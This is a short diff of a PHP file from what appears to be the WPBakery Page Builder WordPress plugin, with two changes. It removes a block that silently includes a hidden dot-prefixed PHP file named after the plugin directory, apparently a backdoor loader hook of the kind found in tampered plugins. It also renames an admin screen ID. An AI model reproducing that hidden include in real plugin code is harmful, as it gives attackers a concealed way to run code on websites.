@@ -16,10 +16,6 @@ add_action( 'vc_before_init', 'vc_check_for_custom_css_build' );
  *
  * @since 4.5
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 function vc_check_for_custom_css_build() {
 	$version = vc_settings()->getCustomCssVersion();
 	if ( vc_user_access()->wpAny( 'manage_options' )->part( 'settings' )->can( 'vc-color-tab' )
@@ -38,7 +34,7 @@ function vc_custom_css_admin_notice() {
 	vc_settings()->set( 'compiled_js_composer_less', '' );
 	$class = 'notice notice-warning vc_settings-custom-design-notice';
 	$message_important = esc_html__( 'Important notice', 'js_composer' );
-	if ( is_object( $current_screen ) && isset( $current_screen->id ) && 'visual-composer_page_vc-color' === $current_screen->id ) {
+	if ( is_object( $current_screen ) && isset( $current_screen->id ) && 'wpbakery-page-builder_page_vc-color' === $current_screen->id ) {
 		$message = esc_html__( 'You have an outdated version of WPBakery Page Builder Design Options. It is required to review and save it.', 'js_composer' );
 		echo '<div class="' . esc_attr( $class ) . '"><p><strong>' . esc_html( $message_important ) . '</strong>: ' . esc_html( $message ) . '</p></div>';
 	} else {
